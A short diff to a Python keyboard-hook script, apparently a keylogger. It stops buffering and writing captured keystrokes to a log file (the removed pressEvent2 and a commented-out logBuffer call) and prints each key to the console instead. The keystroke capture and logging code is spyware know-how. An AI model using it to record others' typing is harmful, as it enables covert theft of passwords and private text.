@@ -51,28 +51,23 @@ def logBuffer():
             f.write(formatChar(i))
 
 
+
+
 def pressEvent(event):
     global running
     global log_file
     global tempBuffer
-    tempBuffer.append(event.Key)
-
+    #tempBuffer.append(event.Key)
+    if event.Key == "Tab":
+        print("Pressed TAB!")
+    else:
+        print("Pressed: [" + event.Key + "]")
     
     
     # ESC to stop
     if event.Ascii == 27:
         print("Turning off!")
         running = False
-
-
-
-def pressEvent2(event):
-    global running
-    global log_file
-
-    with open(log_file, 'a') as log:
-        log.write(event.Key)
-        log.write('\n')
 
 def main():
 
@@ -99,7 +94,7 @@ def main():
     # Start the hook
     hook.start()
 
-    logBuffer()
+    #logBuffer()
     running = True
     while running:
         time.sleep(0.1)
